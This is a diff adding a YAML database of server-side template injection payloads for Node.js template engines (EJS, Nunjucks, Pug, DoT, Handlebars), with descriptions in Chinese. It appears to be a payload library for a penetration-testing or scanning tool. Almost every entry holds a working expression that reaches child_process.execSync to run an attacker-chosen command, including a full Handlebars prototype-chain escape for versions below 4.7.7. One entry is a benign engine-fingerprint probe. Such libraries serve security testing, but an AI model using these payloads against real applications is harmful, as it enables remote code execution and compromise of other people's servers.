@@ -1,0 +1,109 @@
+ruleDB: v0.1.0
+# Node 系：EJS、Nunjucks。定界符 <%%> 与 {{ }}。
+
+templates:
+  - id: ssti.node.ejs.rce.execsync
+    name: EJS execSync 命令执行
+    desc: EJS + Express 场景下最直接的一条，直接拿 global 上的 process。global 被拿掉、或模板跑在沙箱里时，换 constructor 逃逸那条
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [ejs, express]
+    version: "*"
+    body: "<%= global.process.mainModule.require('child_process').execSync('<<cmd>>') %>"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.node.ejs.rce.constructor
+    name: EJS 经 constructor 逃逸
+    desc: global 不可用时，从 this.constructor 拿回 Function 构造器
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [ejs, express]
+    version: "*"
+    body: "<%= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('<<cmd>>') %>"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.node.nunjucks.rce.range
+    name: Nunjucks 经 range 命令执行
+    desc: 借助 range 的 constructor 逃逸到 Function
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [nunjucks]
+    version: "*"
+    body: "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('<<cmd>>')\")()}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.node.pug.rce
+    name: Pug 插值命令执行
+    desc: "Pug 的 #{} 插值里是真 JS。Pug 原名 Jade，是同一个东西"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [pug, jade]
+    version: "*"
+    body: "#{global.process.mainModule.require('child_process').execSync('<<cmd>>')}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.node.dot.rce
+    name: DoT 求值命令执行
+    desc: DoT 用 {{= }} 求值、{{ }} 执行语句
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [dot]
+    version: "*"
+    body: "{{=global.process.mainModule.require('child_process').execSync('<<cmd>>')}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.node.logiceless.detect
+    name: logic-less 引擎指纹
+    desc: Handlebars / Mustache **不做求值**，{{7*7}} 原样输出 7*7。原样输出说明是这两家，输出 49 说明是别的引擎——反向指纹
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [handlebars, mustache]
+    version: "*"
+    body: "{{7*7}}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.node.handlebars.rce
+    name: Handlebars 经 lookup/constructor 命令执行
+    desc: Handlebars 是 logic-less 的，**没有内建的求值能力**，所以它的 RCE 要靠这条链：用 `lookup` 从 `String.prototype` 上取回 `constructor`（即 Function 构造器），再把参数列表 `apply` 上去执行任意 JS。整条链只用内建助手，不需要目标注册任何自定义 helper。**前提是模板被 `compile()` 且没开 `strict`**——4.7.7 起对原型链访问做了限制，这条在 4.7.7 及以上失效。`{{this}}` 那个位置输出命令结果
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [handlebars, express]
+    version: "<4.7.7"
+    body: |-
+      {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('<<cmd>>');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
